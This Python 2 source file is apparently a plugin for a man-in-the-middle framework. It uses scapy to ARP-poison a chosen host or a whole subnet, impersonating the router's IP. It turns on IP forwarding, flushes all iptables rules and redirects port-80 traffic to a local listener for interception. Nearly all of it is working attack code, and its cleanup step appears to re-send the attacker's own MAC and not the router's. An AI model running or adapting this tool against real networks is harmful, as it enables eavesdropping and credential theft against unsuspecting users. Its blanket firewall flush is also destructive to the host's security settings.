
from plugins.plugin import Plugin
from time import sleep
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Gets rid of IPV6 Error when importing scapy
from scapy.all import *
import os, sys, threading

class ArpSpoof(Plugin):
    name = "ARP Spoof"
    optname = "arpspoof"
    desc = 'Redirect traffic using arp-spoofing'
    implements = []
    has_opts = True

    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.interface = options.interface
        self.routerip = options.routerip
        self.summary = options.summary
        self.target = options.target
        self.mode = options.mode
        self.setup = options.setup
        self.mac = get_if_hwaddr(self.interface)
        self.port = self.options.listen
        self.send = True

        if os.geteuid() != 0:
            sys.exit("[-] %s plugin requires root privileges" % self.name)

        if self.interface == None or self.routerip == None:
            sys.exit("[-] %s plugin requires --routerip and --interface" % self.name)

        print "[*] %s plugin online" % self.name
        if self.setup == True:
            print '[*] Setting up ip_forward and iptables'
            file = open('/proc/sys/net/ipv4/ip_forward', 'w')
            file.write('1')
            file.close()
            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.port)

        if self.mode == 'req':
            pkt = self.build_req()
        elif self.mode == 'rep':
            pkt = self.build_rep()

        if self.summary == True:
            pkt.show()
            ans = raw_input('\n[*] Continue? [Y|n]: ').lower()
            if ans == 'y' or len(ans) == 0:
                pass
            else:
                sys.exit(0)

        t = threading.Thread(name='send_packets', target=self.send_packets, args=(pkt,self.interface,))
        t.setDaemon(True)
        t.start()
  
    def send_packets(self,pkt,interface):
        while self.send == True:
            sendp(pkt, inter=2, iface=interface)

    def build_req(self):
        if self.target == None:
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.routerip, pdst=self.routerip)
        elif self.target:
            target_mac = getmacbyip(self.target)
            if target_mac == None:
                sys.exit("[-] Error: Could not resolve targets MAC address")
                
            pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.routerip, hwdst=target_mac, pdst=self.target)
        
        return pkt

    def build_rep(self):
        if self.target == None:
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.routerip, op=2)
        elif self.target:
            target_mac = getmacbyip(self.target)
            if target_mac == None:
                sys.exit("[-] Error: Could not resolve targets MAC address")
                
            pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.routerip, hwdst=target_mac, pdst=self.target, op=2)

        return pkt

    def add_options(self,options):
        options.add_argument('--iface', dest='interface', help='Specify the interface to use')
        options.add_argument('--routerip', dest='routerip', help='Specify the router IP')
        options.add_argument('--target', dest='target', help='Specify a particular host to ARP poison [default: subnet]')
        options.add_argument('--mode', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: req]')
        options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
        options.add_argument('--setup', action='store_true', dest='setup', default=True, help='Setup ip_forward and iptables [default: True]')
    
    def finish(self):
        self.send = False
        sleep(3)
        print '\n[*] Resetting ip_forward and iptables'
        file = open('/proc/sys/net/ipv4/ip_forward', 'w')
        file.write('0')
        file.close()
        os.system('iptables -t nat -F && iptables -t nat -X')
        print '[*] Re-arping network'
        rearp_mac = getmacbyip(self.routerip)
        pkt = Ether(src=rearp_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=self.routerip, hwsrc=self.mac, op=2)
        sendp(pkt, inter=1, count=5, iface=self.interface)
        sys.exit(0)